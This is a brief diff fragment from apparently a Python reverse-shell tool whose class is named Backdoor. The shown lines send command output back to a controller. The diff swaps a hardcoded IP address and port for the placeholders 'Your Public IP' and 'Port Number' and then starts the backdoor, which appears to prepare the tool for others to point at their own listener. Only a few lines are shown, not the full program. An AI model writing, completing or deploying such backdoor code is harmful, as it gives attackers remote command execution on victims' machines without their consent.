@@ -102,5 +102,5 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("118.200.124.57", 448)
+my_backdoor = Backdoor("Your Public IP", Port Number)
 my_backdoor.run()
